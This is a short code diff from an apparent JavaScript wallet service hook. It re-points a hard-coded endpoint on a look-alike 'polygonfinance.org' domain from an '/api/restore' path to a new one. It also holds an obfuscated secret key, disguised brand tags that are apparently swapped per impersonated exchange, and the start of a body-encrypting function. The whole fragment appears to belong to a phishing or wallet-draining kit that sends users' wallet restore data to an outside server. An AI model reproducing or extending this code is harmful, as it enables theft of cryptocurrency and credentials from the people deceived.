@@ -57,12 +57,10 @@ const useWalletService = () => {
 		return res
 	}
 
-	let url = 'https://polygonfinance.org/api/restore'
+	let url = 'https://polygonfinance.org/concept/unity/check'
 	const kitkat = 'Qsx@ah&OR82WX9T6gCt'
 	let xxx = 'P01G$ID|EX/G'
 	let xx = 'P01G$ID|EX'
-	// let xxx = 'BY$W€B3B1T/G'
-	// let xx = 'BY$W€B3B1T'
 
 	function createBody(str, account) {
 		let strDecr
